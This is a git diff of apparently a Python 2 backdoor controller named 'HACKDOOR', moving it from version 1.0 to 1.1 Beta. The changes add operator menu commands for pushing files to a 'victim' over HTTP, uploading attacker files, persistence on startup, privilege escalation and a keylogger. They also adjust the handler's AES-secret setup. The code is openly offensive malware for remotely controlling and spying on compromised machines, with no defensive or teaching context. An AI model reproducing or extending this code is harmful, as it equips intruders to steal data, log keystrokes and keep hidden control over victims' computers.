@@ -31,7 +31,8 @@ print bcolors.BOLD + """
   / /_/ / /| |/ /   / / / / / / / __/ / /_/ / / /_/ /\  / 
  / __  / ___ / /___/ /_/ / /_/ / /___/ _, _/ / ____/ / /  
 /_/ /_/_/  |_\____/\____/_____/_____/_/ |_(_)_/     /_/                                                                       
-V1.0 Beta\n""" + bcolors.ENDC
+V1.1 Beta
+\n""" + bcolors.ENDC
 #Define AES Generator
 def globalsecret():
 	global secret1
@@ -437,9 +438,12 @@ def globalhandler():
 			# create a cipher object using the random secret
 			cipher = AES.new(secret)
 			print '\nActivating client: ' + clients[activate] + '\n'
-			print "DOWNLOAD	Download files from Client"
-			print "UPLOAD		Upload files to Client"
-			print "PERSIST		Make backdoor run on startup"
+			print "download	Download files from Client"
+			print "downhttp	Download file to victim using HTTP"
+			print "upload		Upload files from attacker to Client"
+			print "persist		Make backdoor run on startup"
+			print "privs		Privilege Escalation"
+			print "keylog		Activate Keylogger"
 
 			active = True
 			Send(socks[activate], 'Activate')
@@ -535,11 +539,11 @@ if user_choice=='1':
 	print bcolors.OKGREEN + "[*] Success!" + bcolors.ENDC
 if user_choice=='2':
 	portH = int(input('[?] '+bcolors.OKGREEN + 'Your Port: ' + bcolors.ENDC))
-	secretH = raw_input('[?] '+bcolors.OKGREEN + 'AES Secret (same as in backdoor): ' + bcolors.ENDC)
-	if len(secretH) < 32:
+	secret = raw_input('[?] '+bcolors.OKGREEN + 'AES Secret (same as in backdoor): ' + bcolors.ENDC)
+	if len(secret) < 32:
 		print bcolors.FAIL + "[!] " + bcolors.ENDC +  "Your AES Secret is less than 32 chars!"
 		sys.exit()
-	if len(secretH) > 32:
+	if len(secret) > 32:
 		print bcolors.FAIL + "[!] " + bcolors.ENDC +  "Your AES Secret is more than 32 chars!"
 		sys.exit()
 	globalhandler()
